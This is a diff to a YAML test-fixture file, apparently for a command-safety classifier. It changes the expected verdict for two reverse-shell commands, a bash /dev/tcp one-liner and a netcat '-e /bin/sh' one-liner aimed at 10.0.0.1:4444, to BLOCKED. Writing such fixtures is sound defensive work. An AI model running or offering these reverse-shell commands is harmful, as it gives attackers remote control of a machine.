@@ -509,10 +509,10 @@ fixtures:
   # Reverse shell tests
   # =======================================================================
   - command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
-    expected: "SAFE"
-    description: "bash reverse shell via /dev/tcp — unknown-command fallback remains SAFE"
+    expected: "BLOCKED"
+    description: "bash reverse shell via /dev/tcp"
   - command: "nc -e /bin/sh 10.0.0.1 4444"
-    expected: "CAUTION"
+    expected: "BLOCKED"
     description: "netcat with exec reverse shell"
 
   # =======================================================================
